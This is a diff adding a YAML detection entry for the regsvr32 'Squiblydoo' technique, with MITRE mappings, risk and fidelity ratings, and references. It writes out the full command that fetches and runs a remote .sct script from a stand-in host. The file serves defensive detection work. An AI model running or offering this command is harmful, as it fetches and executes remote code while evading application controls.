@@ -1,0 +1,23 @@
+- command: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
+  description: Abuse of regsvr32 to launch a remotely-hosted malicious .SCT script using scrobj.dll.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218.010
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
+    - https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/
+    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md
+  risk: Critical
+  risk_reason: Regsvr32 interacting with remote files is a critical red-flag in almost all situations.
+  fidelity: High
+  fidelity_reason: This is typically an extremely rare operation for any normal operations.
+  tool: regsvr32
+  threatactors:
+    N/A:
+      - N/A
